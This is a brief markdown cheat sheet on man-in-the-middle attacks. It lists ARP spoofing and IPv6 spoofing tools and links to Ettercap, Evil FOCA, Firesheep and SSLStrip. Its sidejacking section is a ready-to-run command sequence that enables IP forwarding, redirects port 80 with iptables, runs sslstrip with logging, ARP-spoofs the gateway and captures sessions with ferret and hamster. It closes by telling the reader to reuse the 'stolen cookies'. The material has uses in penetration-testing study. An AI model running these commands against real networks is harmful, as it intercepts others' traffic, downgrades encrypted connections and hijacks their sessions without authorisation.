# MITM

## ARP Spoofing (IPv4)

### Cain and Abel (Windows)

[oxid.it - Cain & Abel](https://web.archive.org/web/20190603235413if_/http://www.oxid.it/cain.html)

### Ettercap (Linux)

[GitHub - Ettercap/ettercap](https://github.com/Ettercap/ettercap)

```bash
ettercap -TqM arp: remote /<gateway-ip>/ /<target-ip>/
```

## Neighbor Advertisement Spoofing (IPv6)

### Evil FOCA (Windows)

> Evil Foca is a tool for security pentesters and auditors whose purpose it is to test security in IPv4 and IPv6 data networks.  
[Evil FOCA](https://github.com/ElevenPaths/EvilFOCA)

## Sidejacking

### Hamster/Ferret

Enable ip forwarding
```bash
echo "1" > /proc/sys/net/ipv4/ip_forward
```

Modify ip tables for SSL Strip
```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
```

Run SSL Strip
```bash
sslstrip -f -a -k -l 1000 -w /root/out.txt &
```

Enable ARP spoof
```bash
arpspoof -i eth0 <gateway>
```

Enable Ferret
```bash
ferret -i eth0
```

Start hamster
```bash
hamster
```
-> Use stolen cookies with e.g. FireFox Web Developer Addon -> Add Cookies

### Firesheep

> A Firefox extension that demonstrates HTTP session hijacking attacks.  
[GitHub - codebutler/firesheep](https://github.com/codebutler/firesheep)

### SSLStrip

> A tool for exploiting Moxie Marlinspike's SSL "stripping" attack.  
[GitHub - moxie0/sslstrip](https://github.com/moxie0/sslstrip)
